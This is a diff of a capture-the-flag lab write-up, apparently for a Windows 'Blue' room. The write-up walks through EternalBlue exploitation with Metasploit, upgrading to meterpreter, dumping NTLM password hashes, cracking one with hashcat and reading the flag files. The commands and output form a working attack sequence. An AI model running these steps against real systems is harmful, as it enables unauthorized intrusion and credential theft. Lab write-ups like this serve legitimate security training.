@@ -80,7 +80,7 @@ Matching Modules
 ```
 **Answer**: `exploit/windows/smb/ms17_010_eternalblue`
 ### Show options and set the one required value. What is the name of this value?
-```bash
+```
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -111,6 +111,11 @@ Exploit target:
    --  ----
    0   Windows 7 and Server 2008 R2 (x64) All Service Packs
 ```
+**Answer**: `RHOSTS`
+1. Use the `exploit/windows/smb/ms17_010_eternalblue` module.
+2. Set `LHOST` to your OpenVPN IP.
+3. Set `RHOSTS` to the server's IP.
+4. Start the exploit.
 ```bash
 $ msfconsole -q
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
@@ -157,7 +162,6 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 meterpreter > 
 ```
-**Answer**: `RHOSTS`
 ## Escalate
 ### What is the name of the post module we will use?
 **Answer**: `post/multi/manage/shell_to_meterpreter`
@@ -218,14 +222,19 @@ meterpreter >
 ```
 ## Cracking
 ### What is the name of the non-default user?
+* In a `meterpreter` shell, the `hashdump` command can be used to get the users' password hashes.
 ```
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ```
+
 **Answer**: `Jon`
 ### What is the cracked password?
+* In `hashcat`:
+  * `-D 2` is used to use the GPU for hash cracking.
+  * `-m 1000` is used to crack Windows NTLM hash.
 ```bash
 $ hashcat -D 2 -m 1000 'ffb43f0de35be4d9917ac0cc8ad57f8d' rockyou.txt
 ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
@@ -246,9 +255,11 @@ Restore.Point....: 10174464/14344384 (70.93%)
 Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
 Candidates.#2....: amby6931 -> alisonodonnell1
 ```
+
 **Answer**: `alqfna22`
 ## Find flags!
 ### Flag1? This flag can be found at the system root.
+```
 meterpreter > pwd
 C:\Windows\system32
 meterpreter > cd C:/
@@ -274,6 +285,7 @@ Mode              Size    Type  Last modified              Name
 
 meterpreter > cat flag1.txt 
 flag{access_the_machine}
+```
 **Flag 1**: `flag{access_the_machine}`
 ### Flag2? This flag can be found at the location where passwords are stored within Windows.
 ```
@@ -353,5 +365,3 @@ meterpreter > cat C:/Users/Jon/Documents/flag3.txt
 flag{admin_documents_can_be_valuable}
 ```
 **Flag 3**: `flag{admin_documents_can_be_valuable}`
-
-
